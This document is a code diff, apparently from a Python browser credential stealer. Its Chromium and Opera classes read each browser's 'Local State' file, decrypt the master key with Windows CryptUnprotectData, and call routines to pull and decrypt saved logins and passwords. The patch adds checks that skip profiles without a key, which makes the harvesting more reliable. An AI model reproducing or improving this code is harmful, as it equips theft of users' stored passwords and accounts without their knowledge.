@@ -127,7 +127,9 @@ class Chromium:
                 continue
 
             self.master_key = self.get_master_key(f'{path}\\Local State')
-
+            if not self.master_key:
+                continue
+            
             for profile in self.profiles:
                 if not os.path.exists(path + '\\' + profile):
                     continue
@@ -147,6 +149,9 @@ class Chromium:
                         pass
 
     def get_master_key(self, path: str) -> str:
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -271,6 +276,8 @@ class Opera:
                 continue
 
             self.master_key = self.get_master_key(f'{path}\\Local State')
+            if not self.master_key:
+                continue
 
             operations = [
                 self.get_login_data,
@@ -287,6 +294,9 @@ class Opera:
                     pass
 
     def get_master_key(self, path: str) -> str:
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -294,6 +304,7 @@ class Opera:
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+
         return master_key
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
